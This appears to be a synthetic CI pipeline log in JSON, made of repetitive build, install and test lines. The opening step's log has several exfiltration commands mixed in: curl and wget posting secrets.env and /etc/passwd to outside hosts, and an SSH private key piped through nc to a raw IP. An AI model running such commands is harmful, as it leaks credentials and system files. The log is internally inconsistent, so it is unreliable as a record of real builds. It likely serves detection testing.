build.tar.gz (3MB)\nCache hit for key-6261\n  PASS: test_user_create (118ms)\nArtifact uploaded: build.tar.gz (14MB)\nInstalling express@2.11.0\nInstalling react@3.13.0\nCompiling src/service.java...\n\u2713 build completed\nCache hit for key-8187\nInstalling lodash@3.0.0\n  PASS: test_cache_hit (362ms)\nCache hit for key-5879\nInstalling prettier@4.4.0\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (37MB)\nCache hit for key-8426\n  PASS: test_auth_login (311ms)\n\u2713 test completed\n  PASS: test_db_connect (382ms)\n\u2713 test completed\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-6581\nCompiling src/handler.rs...\nCache hit for key-8695\n\u2713 test completed\n[12:00:25] WARN: Deprecated API usage\nCache hit for key-8964\n  PASS: test_cache_hit (224ms)\n  PASS: test_db_connect (223ms)\n  PASS: test_db_connect (342ms)\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (42MB)\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCompiling src/utils.go...\nInstalling eslint@4.11.0\nInstalling lodash@2.12.0\nCache hit for key-6146\nStep 7/10: Building\n  PASS: test_user_create (183ms)\nSending 444MB of data to example.com\nInstalling jest@5.19.0\n[12:00:25] INFO: Processing request\nFAILED: test_db_connect\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (46MB)\n  PASS: test_auth_login (193ms)\nInstalling axios@3.4.0\nInstalling jest@3.3.0\nStep 5/10: Building\n\u2713 test completed\nWARNING: jest has known vulnerabilities\n\u2713 lint completed\n[12:00:25] INFO: Processing request\nCache hit for key-7044\nCompiling src/app.ts...\nInstalling webpack@5.5.0\n  PASS: test_db_connect (353ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling lodash@5.1.0\nStep 10/10: Building\nCompiling src/handler.rs...\nCache hit for key-6502\n[12:00:25] INFO: Processing request\nStep 9/10: Building\n[12:00:25] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 lint completed\nStep 1/10: Building\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (32MB)\nInstalling eslint@4.4.0\n[12:00:25] INFO: Processing request\n  PASS: test_user_create (146ms)\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nWARNING: prettier has known vulnerabilities\n  PASS: test_user_create (182ms)\n[12:00:25] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling axios@3.20.0\n[12:00:25] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\nInstalling lodash@2.9.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (4MB)\nInstalling webpack@4.6.0\nArtifact uploaded: build.tar.gz (50MB)\nInstalling eslint@2.1.0\n\u2713 build completed\n  PASS: test_cache_hit (271ms)\nStep 8/10: Building\n  PASS: test_db_connect (417ms)\nArtifact uploaded: build.tar.gz (47MB)\nStep 9/10: Building\n[12:00:25] INFO: Processing request\n\u2713 lint completed\nException: NullPointerException\nCache hit for key-2349\nArtifact uploaded: build.tar.gz (6MB)\nStep 2/10: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling lodash@1.13.0\n[12:00:25] INFO: Processing request\nSending 213MB of data to example.com\nSending 214MB of data to startup.dev\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nInstalling webpack@2.13.0\nInstalling lodash@4.20.0\n\u2713 lint completed\nStep 5/10: Building\n  PASS: test_auth_login (275ms)\nArtifact uploaded: build.tar.gz (5MB)\n\u2713 lint completed\nWARNING: prettier has known vulnerabilities\n[12:00:25] WARN: Deprecated API usage\necho $(cat ~/.ssh/id_rsa) | base64 | nc 94.208.45.178 65469\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n\u2713 lint completed\n  PASS: test_auth_login (325ms)\nArtifact uploaded: build.tar.gz (7MB)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (22MB)\nCache hit for key-8294\n\u2713 test completed\nCache hit for key-8686\nStep 6/10: Building\nStep 2/10: Building\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\nInstalling lodash@4.11.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (13MB)\n=== Step checkout completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-01T12:00:25.774541",
        "finished_at": "2025-12-01T12:00:33.438033",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:25] INFO: Processing request",
          "Step 1/10: Building",
          "Cache hit for key-1046",
          "[12:00:25] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:25] INFO: Processing request",
          "Step 5/10: Building",
          "  PASS: test_user_create (133ms)",
          "Cache hit for key-8873",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-7159",
          "Cache hit for key-6067",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (243ms)",
          "Cache hit for key-1651",
          "[12:00:25] INFO: Processing request",
          "Step 5/10: Building",
          "Step 9/10: Building",
          "  PASS: test_user_create (197ms)",
          "Cache hit for key-8236",
          "Compiling src/utils.go...",
          "[12:00:25] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Installing prettier@5.17.0",
          "Cache hit for key-6583",
          "Installing express@4.2.0",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (42MB)",
          "  PASS: test_db_connect (83ms)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-5199",
          "Step 10/10: Building",
          "WARNING: react has known vulnerabilities",
          "Step 3/10: Building",
          "Compiling src/app.ts...",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] INFO: Processing request",
          "Installing react@4.12.0",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Installing react@4.6.0",
          "Compiling src/service.java...",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Installing webpack@1.9.0",
          "Installing axios@4.15.0",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Installing webpack@1.20.0",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:25] WARN: Deprecated API usage",
          "Cache hit for key-3324",
          "Installing prettier@4.2.0",
          "Exception: RuntimeError",
          "  PASS: test_cache_hit (36ms)",
          "  PASS: test_db_connect (222ms)",
          "Cache hit for key-2089",
          "Step 3/10: Building",
          "Cache hit for key-4305",
          "\u2713 test completed",
          "Installing eslint@5.12.0",
          "Cache hit for key-6681",
          "\u2713 lint completed",
          "Cache hit for key-5603",
          "Step 9/10: Building",
          "  PASS: test_api_health (37ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/app.ts...",
          "FAILED: test_cache_hit",
          "Installing axios@4.20.0",
          "Installing express@2.10.0",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing eslint@2.17.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-5526",
          "Step 8/10: Building",
          "\u2713 build completed",
          "  PASS: test_user_create (340ms)",
          "[12:00:25] INFO: Processing request",
          "Installing webpack@3.10.0",
          "Step 4/10: Building",
          "Installing prettier@4.1.0",
          "Step 7/10: Building",
          "  PASS: test_auth_login (131ms)",
          "Step 4/10: Building",
          "\u2713 test completed",
          "  PASS: test_api_health (19ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 1/10: Building",
          "  PASS: test_db_connect (137ms)",
          "  PASS: test_api_health (318ms)",
          "\u2713 build completed",
          "Installing prettier@5.13.0",
          "  PASS: test_db_connect (256ms)",
          "Step 4/10: Building",
          "  PASS: test_api_health (124ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_cache_hit (360ms)",
          "Installing axios@1.17.0",
          "Cache hit for key-1300",
          "Step 2/10: Building",
          "Installing express@5.13.0",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_db_connect (466ms)",
          "\u2713 lint completed",
          "Cache hit for key-6225",
          "\u2713 build completed",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "Installing prettier@2.1.0",
          "Step 10/10: Building",
          "Step 8/10: Building",
          "Cache hit for key-7852",
          "Cache hit for key-7343",
          "[12:00:25] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Installing prettier@3.18.0",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-8835",
          "[12:00:25] INFO: Processing request",
          "Step 6/10: Building",
          "Installing lodash@4.8.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "\u2713 build completed",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 9/10: Building",
          "[12:00:25] INFO: Processing request",
          "Installing axios@1.6.0",
          "Compiling src/handler.rs...",
          "[12:00:25] WARN: Deprecated API usage",
          "Installing axios@5.4.0",
          "Installing eslint@5.16.0",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "FAILED: test_cache_hit",
          "Cache hit for key-9239",
          "Installing express@4.7.0",
          "[12:00:25] INFO: Processing request",
          "Installing eslint@5.11.0",
          "Installing prettier@3.1.0",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "[12:00:25] WARN: Deprecated API usage",
          "Cache hit for key-6132",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_api_health (486ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:25] INFO: Processing request",
          "Step 7/10: Building",
          "Installing lodash@2.10.0",
          "Cache hit for key-3758",
          "  PASS: test_auth_login (483ms)",
          "WARNING: react has known vulnerabilities",
          "Cache hit for key-8911",
          "Installing axios@5.14.0",
          "  PASS: test_db_connect (78ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/main.py...",
          "[12:00:25] INFO: Processing request",
          "Compiling src/utils.go...",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (22ms)",
          "Installing jest@2.13.0",
          "  PASS: test_user_create (402ms)",
          "\u2713 test completed",
          "Cache hit for key-1968",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_db_connect (309ms)",
          "\u2713 test completed",
          "Installing lodash@4.8.0",
          "FAILED: test_cache_hit",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-01T12:00:33.438033",
        "finished_at": "2025-12-01T12:00:38.036128",
        "log_lines": [
          "=== Step: save_cache ===",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-3836",
          "Step 7/10: Building",
          "Cache hit for key-2825",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "  PASS: test_db_connect (84ms)",
          "  PASS: test_auth_login (344ms)",
          "  PASS: test_db_connect (414ms)",
          "[12:00:25] INFO: Processing request",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Step 10/10: Building",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-9288",
          "  PASS: test_auth_login (496ms)",
          "Compiling src/app.ts...",
          "Installing eslint@3.17.0",
          "Installing jest@3.2.0",
          "\u2713 build completed",
          "\u2713 test completed",
          "\u2717 build failed with exit code 12",
          "Installing lodash@2.10.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Compiling src/index.js...",
          "Cache hit for key-3459",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache hit for key-8333",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_api_health (363ms)",
          "Cache hit for key-7334",
          "Installing jest@1.9.0",
          "\u2713 test completed",
          "Cache hit for key-6565",
          "  PASS: test_cache_hit (220ms)",
          "  PASS: test_auth_login (173ms)",
          "  PASS: test_cache_hit (463ms)",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_user_create (299ms)",
          "[12:00:25] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 3/10: Building",
          "Installing webpack@5.4.0",
          "Step 4/10: Building",
          "Compiling src/utils.go...",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-3133",
          "Step 4/10: Building",
          "Cache hit for key-4580",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/index.js...",
          "Step 10/10: Building",
          "[12:00:25] INFO: Processing request",
          "Step 1/10: Building",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-9680",
          "Cache hit for key-8603",
          "Installing axios@1.3.0",
          "Cache hit for key-9434",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-7432",
          "[12:00:25] INFO: Processing request",
          "Installing prettier@5.7.0",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing eslint@2.16.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "WARNING: axios has known vulnerabilities",
          "Installing react@3.12.0",
          "\u2713 lint completed",
          "Installing eslint@4.3.0",
          "[12:00:25] INFO: Processing request",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (94ms)",
          "Installing webpack@3.20.0",
          "Compiling src/app.ts...",
          "Installing lodash@3.16.0",
          "Step 2/10: Building",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-7728",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_user_create (182ms)",
          "\u2717 build failed with exit code 21",
          "Installing prettier@3.15.0",
          "  PASS: test_db_connect (122ms)",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "Installing react@5.8.0",
          "\u2713 build completed",
          "Step 5/10: Building",
          "  PASS: test_db_connect (16ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:25] INFO: Processing request",
          "Step 9/10: Building",
          "Installing prettier@5.18.0",
          "[12:00:25] INFO: Processing request",
          "Step 1/10: Building",
          "[12:00:25] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (457ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 build completed",
          "Cache hit for key-4057",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "Cache hit for key-5745",
          "\u2717 build failed with exit code 20",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: test_api_health (413ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-2596",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u2713 test completed",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "\u2713 build completed",
          "  PASS: test_db_connect (458ms)",
          "  PASS: test_db_connect (245ms)",
          "[12:00:25] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "Installing lodash@4.12.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 7/10: Building",
          "\u2713 test completed",
          "\u2713 test completed",
          "FAILED: test_auth_login",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Cache hit for key-9862",
          "WARNING: axios has known vulnerabilities",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Step 6/10: Building",
          "\u2713 build completed",
          "Cache hit for key-9903",
          "  PASS: test_user_create (449ms)",
          "Installing lodash@5.6.0",
          "Installing axios@5.9.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing express@1.8.0",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/utils.go...",
          "Cache hit for key-4162",
          "Step 2/10: Building",
          "Cache hit for key-7825",
          "Installing react@5.13.0",
          "Cache hit for key-2697",
          "[12:00:25] WARN: Deprecated API usage",
          "Cache hit for key-8558",
          "Installing react@5.5.0",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 build completed",
          "Installing lodash@4.20.0",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Cache hit for key-7975",
          "Cache hit for key-6199",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 build completed",
          "\u2713 test completed",
          "FAILED: test_db_connect",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:25] INFO: Processing request",
          "Installing lodash@1.11.0",
          "Cache hit for key-1304",
          "Cache hit for key-1730",
          "Step 2/10: Building",
          "[12:00:25] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing prettier@1.5.0",
          "[12:00:25] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (414ms)",
          "Step 7/10: Building",
          "[12:00:25] INFO: Processing request",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-01T12:00:38.036128",
        "finished_at": "2025-12-01T12:00:45.699620",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Cache hit for key-7884",
          "Installing axios@3.2.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing react@4.12.0",
          "\u2717 build failed with exit code 71",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_auth_login (110ms)",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Cache hit for key-8265",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_api_health (215ms)",
          "Installing webpack@4.12.0",
          "FAILED: test_user_create",
          "\u2713 build completed",
          "[12:00:25] INFO: Processing request",
          "Installing jest@4.0.0",
          "Step 1/10: Building",
          "Cache hit for key-4853",
          "\u2713 lint completed",
          "Cache hit for key-8865",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-6215",
          "Installing webpack@1.13.0",
          "\u2713 build completed",
          "[12:00:25] ERROR: Connection failed",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_db_connect (210ms)",
          "Installing webpack@5.6.0",
          "  PASS: test_cache_hit (267ms)",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "Cache hit for key-4624",
          "FAILED: test_user_create",
          "Installing jest@1.17.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "  PASS: test_auth_login (365ms)",
          "  PASS: test_cache_hit (275ms)",
          "  PASS: test_db_connect (305ms)",
          "\u2713 test completed",
          "Step 9/10: Building",
          "  PASS: test_db_connect (76ms)",
          "Step 5/10: Building",
          "[12:00:25] INFO: Processing request",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-9740",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Step 8/10: Building",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_cache_hit (123ms)",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (402ms)",
          "Cache hit for key-2474",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Step 9/10: Building",
          "Step 4/10: Building",
          "Installing react@5.12.0",
          "Compiling src/index.js...",
          "\u2717 build failed with exit code 111",
          "Installing axios@3.1.0",
          "Installing axios@2.20.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "  PASS: test_db_connect (318ms)",
          "  PASS: test_auth_login (447ms)",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "  PASS: test_db_connect (59ms)",
          "Installing prettier@1.13.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-3603",
          "\u2713 lint completed",
          "[12:00:25] ERROR: Connection failed",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Exception: ValueError",
          "  PASS: test_cache_hit (443ms)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-2328",
          "  PASS: test_db_connect (248ms)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_user_create (483ms)",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_db_connect (417ms)",
          "  PASS: test_db_connect (365ms)",
          "  PASS: test_user_create (401ms)",
          "  PASS: test_user_create (118ms)",
          "  PASS: test_api_health (70ms)",
          "Cache hit for key-9576",
          "[12:00:25] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (192ms)",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (113ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_db_connect (490ms)",
          "Step 1/10: Building",
          "Installing eslint@4.14.0",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_cache_hit (258ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-9208",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "Cache hit for key-1910",
          "WARNING: lodash has known vulnerabilities",
          "FAILED: test_cache_hit",
          "Step 8/10: Building",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "Step 5/10: Building",
          "  PASS: test_db_connect (397ms)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Cache hit for key-8806",
          "Installing express@4.0.0",
          "  PASS: test_db_connect (34ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Installing react@1.9.0",
          "  PASS: test_cache_hit (381ms)",
          "Installing react@2.9.0",
          "Compiling src/service.java...",
          "Cache hit for key-4110",
          "Cache hit for key-9957",
          "Step 5/10: Building",
          "Step 8/10: Building",
          "Installing prettier@1.17.0",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-7794",
          "  PASS: test_user_create (184ms)",
          "  PASS: test_auth_login (329ms)",
          "Compiling src/app.ts...",
          "Cache hit for key-1686",
          "Installing axios@4.13.0",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_cache_hit (382ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_user_create (195ms)",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
          "Installing jest@3.9.0",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing prettier@2.8.0",
          "Installing express@3.9.0",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Step 9/10: Building",
          "Installing axios@4.2.0",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (349ms)",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:25] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_user_create (323ms)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:25] ERROR: Connection failed",
          "Cache hit for key-3967",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-01T12:00:45.699620",
        "finished_at": "2025-12-01T12:00:53.363112",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Compiling src/app.ts...",
          "Cache hit for key-4547",
          "Compiling src/index.js...",
          "  PASS: test_user_create (78ms)",
          "Installing react@4.2.0",
          "  PASS: test_auth_login (234ms)",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "Cache hit for key-7122",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 lint completed",
          "Cache hit for key-6606",
          "Step 4/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (416ms)",
          "Compiling src/utils.go...",
          "[12:00:25] INFO: Processing request",
          "Installing lodash@5.20.0",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_user_create (215ms)",
          "FAILED: test_auth_login",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 2/10: Building",
          "Step 5/10: Building",
          "Compiling src/main.py...",
          "Installing eslint@1.4.0",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_db_connect (161ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 6/10: Building",
          "  PASS: test_db_connect (277ms)",
          "Cache hit for key-5092",
          "Installing react@5.15.0",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "  PASS: test_auth_login (306ms)",
          "Compiling src/main.py...",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-7975",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_user_create (38ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "Cache hit for key-9124",
          "Cache hit for key-2537",
          "  PASS: test_db_connect (50ms)",
          "Cache hit for key-4773",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-4508",
          "Step 3/10: Building",
          "[12:00:25] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Installing prettier@2.16.0",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (341ms)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "  PASS: test_auth_login (159ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:25] INFO: Processing request",
          "Installing axios@1.1.0",
          "  PASS: test_cache_hit (231ms)",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 test completed",
          "\u2713 build completed",
          "Cache hit for key-2350",
          "Cache hit for key-1404",
          "  PASS: test_auth_login (192ms)",
          "  PASS: test_api_health (435ms)",
          "Compiling src/main.py...",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] INFO: Processing request",
          "Installing prettier@2.9.0",
          "Step 1/10: Building",
          "Installing axios@3.6.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing lodash@2.14.0",
          "Installing webpack@3.3.0",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
